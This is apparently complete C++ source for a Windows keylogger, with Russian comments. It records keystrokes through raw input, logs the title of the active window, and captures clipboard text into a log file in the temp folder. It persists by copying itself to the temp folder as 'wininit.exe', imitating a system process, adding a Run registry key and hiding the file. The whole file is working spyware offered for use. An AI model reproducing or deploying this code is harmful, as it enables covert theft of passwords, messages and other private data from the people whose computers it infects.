#include <windows.h>
#include "extra_keys.hh"

#define LOG_FILENAME L"your-log.txt"
#define PK_MUTEX "FuckYourAV"

HANDLE hProcHeap;

HANDLE hLog;
HANDLE hMutex;

typedef BOOL(WINAPI*fnAddClipboardFormatListener)(HWND hwnd);

/*
	Запись в лог
*/
void appendLog(LPCWSTR str)
{
	DWORD _d;
	WriteFile(hLog, str, lstrlenW(str)*sizeof(WCHAR), &_d, NULL);
}

/*
	Резолвинг клавиш
*/
void resolveKey(USHORT key, bool pressed)
{
	HKL hKbLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
	static WCHAR wKey;
	static WCHAR keyName[32];
	static BYTE lpKeyState[256];

	switch (key)
	{
	case VK_ESCAPE:
		if (pressed)
			appendLog(K_ESC);
		break;
	case VK_PRIOR:
		if (pressed)
			appendLog(K_PDU);
		break;
	case VK_NEXT:
		if (pressed)
			appendLog(K_PDN);
		break;
	case VK_INSERT:
		if (pressed)
			appendLog(K_INS);
		break;
	case VK_LWIN:case VK_RWIN:
		if (pressed)
			appendLog(K_WIN);
		break;
	case VK_DELETE:
		if (pressed)
			appendLog(K_DEL);
		break;
	case VK_MENU:
		if (pressed)
			appendLog(K_ALT);
		break;
	case VK_TAB:
		if (pressed)
			appendLog(K_TAB);
		break;
	case VK_CONTROL:
		if (pressed)
			appendLog(K_CTRL);
		break;
	case VK_CAPITAL:
		if (pressed)
			appendLog(K_CAPSL);
		break;
	case VK_NUMLOCK:
		if (pressed)
			appendLog(K_NUML);
		break;
	case VK_HOME:
		if (pressed)
			appendLog(K_HOME);
		break;
	case VK_END:
		if (pressed)
			appendLog(K_END);
		break;
	case VK_BACK:
		if (pressed)
			appendLog(K_BACK);
		break;
	case VK_SPACE:
		if (pressed)
			appendLog(K_SPACE);
		break;
	case VK_RETURN:
		if (pressed)
			appendLog(K_ENTER);
		break;

	case VK_F1: if (pressed)appendLog(K_F1); break;
	case VK_F2: if (pressed)appendLog(K_F2); break;
	case VK_F3: if (pressed)appendLog(K_F3); break;
	case VK_F4: if (pressed)appendLog(K_F4); break;
	case VK_F5: if (pressed)appendLog(K_F5); break;
	case VK_F6: if (pressed)appendLog(K_F6); break;
	case VK_F7: if (pressed)appendLog(K_F7); break;
	case VK_F8: if (pressed)appendLog(K_F8); break;
	case VK_F9: if (pressed)appendLog(K_F9); break;
	case VK_F10: if (pressed)appendLog(K_F10); break;
	case VK_F11: if (pressed)appendLog(K_F11); break;
	case VK_F12: if (pressed)appendLog(K_F12); break;
	case VK_F13: if (pressed)appendLog(K_F13); break;
	case VK_F14: if (pressed)appendLog(K_F14); break;
	case VK_F15: if (pressed)appendLog(K_F15); break;
	case VK_F16: if (pressed)appendLog(K_F16); break;
	case VK_F17: if (pressed)appendLog(K_F17); break;
	case VK_F18: if (pressed)appendLog(K_F18); break;
	case VK_F19: if (pressed)appendLog(K_F19); break;
	case VK_F20: if (pressed)appendLog(K_F20); break;
	case VK_F21: if (pressed)appendLog(K_F21); break;
	case VK_F22: if (pressed)appendLog(K_F22); break;
	case VK_F23: if (pressed)appendLog(K_F23); break;
	case VK_F24: if (pressed)appendLog(K_F24); break;


	case VK_LEFT:	if (pressed)appendLog(L"[<-]"); break;
	case VK_UP:		if (pressed)appendLog(L"[uArr]"); break;
	case VK_RIGHT:	if (pressed)appendLog(L"[->]"); break;
	case VK_DOWN:	if (pressed)appendLog(L"[dArr]"); break;

	default:
		if (pressed)
		{
			   UINT sCode = MapVirtualKeyExW(key, MAPVK_VK_TO_VSC_EX, hKbLayout);

			   GetKeyboardState(lpKeyState);
			   if (ToUnicodeEx(key, sCode, lpKeyState, &wKey, 1, 0, hKbLayout)){
				   if (wKey == 3)
					   appendLog(L"[CTRL+C]");
				   else if (wKey == 22)
					   appendLog(L"[CTRL+V]");
				   else appendLog(&wKey);
			   }
			   else if (GetKeyNameTextW(MAKELONG(0, MapVirtualKeyW(key, 0)), keyName, 32) > 0){
				   appendLog(L"[");
				   appendLog(keyName);
				   appendLog(L"]");
			   }

			   break;
		}
	}

	return;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	static WCHAR lastWin[256];
	static WCHAR currWin[256];
	static RAWINPUT rawData;

	switch (uMsg)
	{
	case WM_CREATE:

		RAWINPUTDEVICE rid;
		rid.usUsage = 0x6; // клавиатура
		rid.usUsagePage = 0x1;
		rid.hwndTarget = hwnd;
		rid.dwFlags = RIDEV_INPUTSINK;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));

		break;

	case WM_INPUT:
		GetWindowTextW(GetForegroundWindow(), currWin, 256); // проверяем, изменилось ли переднее окно
		if (lstrcmpW(lastWin, currWin) != 0){
			appendLog(L"\n[");
			appendLog(currWin);	// пишем в лог 
			appendLog(L"]:\n");
			lstrcpyW(lastWin, currWin);
		}

		{
			DWORD size = sizeof(rawData);
			GetRawInputData((HRAWINPUT)lParam, RID_INPUT, (LPVOID)&rawData, (LPUINT)&size, sizeof(RAWINPUTHEADER)); // получаем ввод с клавиатуры
			resolveKey(rawData.data.keyboard.VKey, (rawData.data.keyboard.Message == WM_KEYDOWN ||
				rawData.data.keyboard.Message == WM_SYSKEYDOWN) ? true : false);

		}
		break;

	case WM_CLIPBOARDUPDATE:
		{             
                if (IsClipboardFormatAvailable(CF_UNICODETEXT)){
                    BOOL isOpened = FALSE;
                    int c = 0;
                    while (isOpened != TRUE || c > 100){
                        c++;
                        isOpened = OpenClipboard(hwnd);
                        if (isOpened){
                            HANDLE hMem = GetClipboardData(CF_UNICODETEXT);
                            LPWSTR clipData = (LPWSTR)GlobalLock(hMem);
                            if (clipData != NULL){
                                appendLog(L"\n\n[Clipboard]\n");
                                appendLog(clipData);
                                appendLog(L"\n[Clipboard end]\n\n");
                                GlobalUnlock(hMem);
                            }
                            CloseClipboard(); 
                        }
                    }
                }
		}
		break;

	case WM_DESTROY:
		FlushFileBuffers(hLog);
		CloseHandle(hLog);
		CloseHandle(hMutex);
		PostQuitMessage(0);
		break;

	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);

	}

}

/*
	Закрепление
*/
void setAutorun()
{
	WCHAR temp[MAX_PATH];
	ZeroMemory(temp, MAX_PATH*sizeof(WCHAR));
	GetTempPathW(MAX_PATH, temp);
	lstrcatW(temp, L"wininit.exe");

	HKEY hRun;
	RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_QUERY_VALUE, &hRun);

	WCHAR regPath[MAX_PATH];
	ZeroMemory(regPath, MAX_PATH*sizeof(WCHAR));
	DWORD type, size;
	RegQueryValueExW(hRun, L"wininit", NULL, &type, (LPBYTE)regPath, &size);

	if (lstrcmpW(regPath, temp) != 0){
		WCHAR modPath[MAX_PATH];
		ZeroMemory(modPath, MAX_PATH*sizeof(WCHAR));
		GetModuleFileNameW(NULL, modPath, MAX_PATH);

		CopyFileW(modPath, temp, FALSE);
		
		ZeroMemory(modPath, MAX_PATH*sizeof(WCHAR));

		RegSetKeyValueW(hRun, NULL, L"wininit", REG_SZ, temp, lstrlenW(temp)*sizeof(WCHAR));
	}

	DWORD oldAttrs = GetFileAttributesW(temp);
	SetFileAttributesW(temp, oldAttrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED);

	ZeroMemory(temp, MAX_PATH*sizeof(WCHAR));
	ZeroMemory(regPath, MAX_PATH*sizeof(WCHAR));
	RegCloseKey(hRun);
}

/*
	Инициализация при запуске
*/
bool initK()
{
	hMutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, PK_MUTEX);
	if (hMutex)
		return false;
	else
		hMutex = CreateMutexA(NULL, TRUE, PK_MUTEX);

	WCHAR temp[MAX_PATH];
	ZeroMemory(temp, MAX_PATH*sizeof(WCHAR));

	GetTempPathW(MAX_PATH, temp);
	lstrcatW(temp, LOG_FILENAME);

	hLog = CreateFileW(temp, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLog == INVALID_HANDLE_VALUE)
		return false;

	SetFilePointer(hLog, 0, NULL, FILE_END);

	ZeroMemory(temp, MAX_PATH*sizeof(WCHAR));

	SYSTEMTIME st{0};
	GetSystemTime(&st);
	wsprintfW(temp, L"\n\n[%.2d.%.2d.%.4d]\n\n", st.wDay, st.wMonth, st.wYear);
	appendLog(temp);
	ZeroMemory(temp, MAX_PATH*sizeof(WCHAR));

	return true;
}

/*
	Установка

	Прим. Установка выполняется при запуске с ключом -i
*/
bool install()
{
	setAutorun();

	return true;
}


int WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int nCmdShow)
{
	hProcHeap = GetProcessHeap();

	int argc;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1)
	{
		if (lstrcmpW(argv[1], L"-i") == 0){ // только установка
			install();
			return 0;
		}
		else if (lstrcmpW(argv[1], L"-iR")) // установка и выполнение
			install();
	}

	if ( !initK() )
		return 0;

	setAutorun();

	WNDCLASSEXW wc;
	HWND hwnd = NULL;

	const WCHAR MyClassName[] = L"MyClassName";

	ZeroMemory(&wc, sizeof(WNDCLASSEX));
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = MyClassName;

	if (!RegisterClassExW(&wc))
	{
		appendLog(L"Не удалось зарегать класс!\n");
		return 0;
	}

	if (!(hwnd = CreateWindowExW(0, MyClassName, NULL, 0, 0, 0, 0, 0, 0, NULL, hInstance, NULL)))
	{
		appendLog(L"Не удалось создать окно!\n");
		return 0;
	}

	fnAddClipboardFormatListener AddClipboardFormatListener;
	AddClipboardFormatListener = (fnAddClipboardFormatListener)GetProcAddress(LoadLibraryA("user32.dll"), "AddClipboardFormatListener");
	AddClipboardFormatListener(hwnd);

	MSG msg;
	while (GetMessageW(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	return 0;
}